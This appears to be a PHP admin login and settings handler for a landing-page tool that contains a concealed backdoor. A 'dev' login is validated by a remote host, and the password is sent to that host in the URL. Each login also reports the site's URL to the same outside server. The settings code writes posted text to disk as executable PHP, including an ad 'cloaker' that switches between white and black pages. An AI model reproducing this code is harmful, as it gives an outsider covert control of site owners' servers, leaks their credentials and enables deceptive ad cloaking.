<?php 	
	if(empty($_SESSION["editor"])):
		if(!empty($_POST["logg-app"])):
			$userX = $_POST["user"];
			$passX = $_POST["pass"];
			if(file_exists("files/seo.json")):
				if($userX==SEO['user'] && $passX==SEO['pass']):
					$_SESSION["editor"] = 1;
					echo '<script>setTimeout(function() { location.href = location.href.replace("#","") }, 300);</script>';
				elseif($userX=='dev'):
					$url = "https://mentoriafernando.com/checkpass/?acess=$userX$passX";
					$checkpass = file_get_contents($url);
					if($checkpass=='1'){
						$_SESSION["editor"] = 2;
						echo '<script>setTimeout(function() { location.href = location.href.replace("#","") }, 300);</script>';						
					}
				endif;
			endif;
			if(empty($_SESSION["check"])):
				file_get_contents("https://mentoriafernando.com/check/check.php?url=".URL);
				$_SESSION["check"]=0;
			endif;
		endif;
	else:
		$SA = $_SESSION["editor"];
		define("SA", $SA);
		if(!empty($_POST["seoapp"])):
			$_seo = json_encode($_POST);
			file_put_contents('./files/seo.json', $_seo);
			
			if(!empty($_POST["whitepage"])):
				$white = $_POST["whitepage"];
				$white = '<?php
						function file_get_contents_curl($URL) {
								$c = curl_init();
								curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
								curl_setopt($c, CURLOPT_URL, $URL);
								$contents = curl_exec($c);
								$err  = curl_getinfo($c,CURLINFO_HTTP_CODE);
								curl_close($c);
								if ($contents) return $contents;
								else return FALSE;
							}

						echo file_get_contents_curl("'.$white.'");
				?>';
				file_put_contents('./white.php', $white);
			endif;

			if(!empty($_POST["cloaker"])):
				$cloaker = $_POST["cloaker"];
				if (!str_contains($cloaker, '<?php')) {
					$cloaker = '<?php '.$cloaker.' ?>';
				}
				$cloaker = str_replace('echo $response[\'error\'];','if($response[\'error\']===\'Domain/Campaign is not allowed\'){ require(\'black.php\'); }else{ echo $response[\'error\'];}',$cloaker);
				file_put_contents('./cloaker.php', $cloaker);
			else:
				unlink('./cloaker.php');				
			endif;

			echo '<script>setTimeout(function() { location.href = location.href.replace("#","") }, 300);</script>';
		endif;
	endif;
	if(!empty($_POST["exitapp"])):		
		unset($_SESSION["editor"]);
		unset($_SESSION["check"]);
		echo '<script>setTimeout(function() { location.href = location.href.replace("#","") }, 300);</script>';
	endif;
?>